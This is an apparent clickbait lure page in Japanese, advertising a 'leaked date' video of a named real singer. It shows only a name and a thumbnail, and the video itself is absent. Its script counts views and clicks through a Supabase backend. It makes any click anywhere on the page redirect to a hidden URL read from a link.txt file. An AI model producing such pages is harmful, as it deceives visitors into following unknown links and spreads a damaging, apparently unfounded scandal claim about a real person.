<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>【閲覧注意】大森靖子デート流出</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
      background: #fafafa;
      min-height: 100vh;
      cursor: pointer;
    }
    .container {
      max-width: 480px;
      margin: 0 auto;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 100px 20px 40px;
    }
    .profile-name {
      font-size: 19px;
      font-weight: 700;
      color: #111;
      margin-bottom: 32px;
      letter-spacing: 0.5px;
    }
    .video-wrap {
      width: 100%;
      border-radius: 16px;
      overflow: hidden;
      background: #111;
      aspect-ratio: 16/9;
      box-shadow: 0 8px 32px rgba(0,0,0,0.13);
    }
    .video-wrap img { width: 100%; height: 100%; object-fit: cover; display: block; }
  </style>
</head>
<body>
  <div class="container">
    <div class="profile-name">【デート流出】大森靖子</div>
    <div class="video-wrap"><img src="https://click-click.site/Sakusan/20260618_2129/thumb.jpg" alt=""></div>
  </div>
  <script>
    (function() {
      var SB = 'https://qvttkbjxnvsbufaxqpkj.supabase.co';
      var KEY = 'sb_publishable_Ab6lztc5Y2BHT7IRXXrzMg_soFsDudr';
      var PATH = 'Sakusan/20260618_2129';
      function rpc(fn) {
        fetch(SB + '/rest/v1/rpc/' + fn, {
          method: 'POST',
          headers: { apikey: KEY, Authorization: 'Bearer ' + KEY, 'Content-Type': 'application/json' },
          body: JSON.stringify({ p_path: PATH }),
          keepalive: true
        }).catch(function(){});
      }
      rpc('increment_pv');
      fetch('./link.txt').then(function(r){ return r.text(); }).then(function(url) {
        document.body.onclick = function() {
          rpc('increment_ct');
          setTimeout(function(){ window.location.href = url.trim(); }, 100);
        };
      });
    })();
  </script>
</body>
</html>
